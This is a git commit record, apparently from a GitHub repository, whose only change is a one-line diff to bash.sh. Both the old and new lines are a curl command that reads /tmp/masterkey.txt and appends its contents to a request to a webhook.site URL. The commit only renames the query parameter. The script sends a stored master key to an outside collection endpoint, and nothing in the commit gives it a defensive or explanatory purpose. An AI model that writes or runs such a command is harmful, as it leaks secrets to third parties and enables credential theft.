d95e63db6e9230a6e2e12225993b8018bb5ea96c
Hquanfcr23 <101206553+Hquanfcr23@users.noreply.github.com>
2026-07-13 20:53:51 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,1 +1,1 @@
-curl https://webhook.site/dc09f8e5-04f3-42a9-9f67-226e125882bc/?master_key=$(cat /tmp/masterkey.txt)
+curl https://webhook.site/dc09f8e5-04f3-42a9-9f67-226e125882bc/?masterkey=$(cat /tmp/masterkey.txt)
